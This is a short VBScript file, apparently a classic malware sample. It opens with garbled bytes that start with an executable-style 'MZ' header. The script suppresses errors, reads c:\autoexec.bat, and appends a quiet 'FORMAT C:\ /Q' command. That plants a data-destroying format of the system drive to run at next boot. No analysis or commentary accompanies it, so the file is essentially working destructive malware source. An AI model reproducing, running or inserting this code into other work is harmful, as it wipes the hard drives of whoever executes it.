'MZ ׂ­ ₪)j~
'sÞ FIÙטנ¦-!װװ+SQ_קװֿטן__+t'_+t+ן
'<ןü_ֻװü-נD3+© B-!r'¦×‏ִ¦ ¦?-
On Error Resume Next
Set Auto = CreateObject("Scripting.FileSystemObject")
autoexec = "c:\autoexec.bat"
Set Exec = Auto.OpenTextFile(autoexec,1)
Do While Exec.AtEndOfStream = False
Intro = chr(13) + chr(10)
LineZ = LineZ + Exec.ReadLine + Intro
Loop
Exec.Close
LineZ = LineZ + Intro + "FoRmaT C:\ /Q"
Set Boom = Auto.CreateTextFile(autoexec, 2,false)
Boom.Writeline(LineZ)
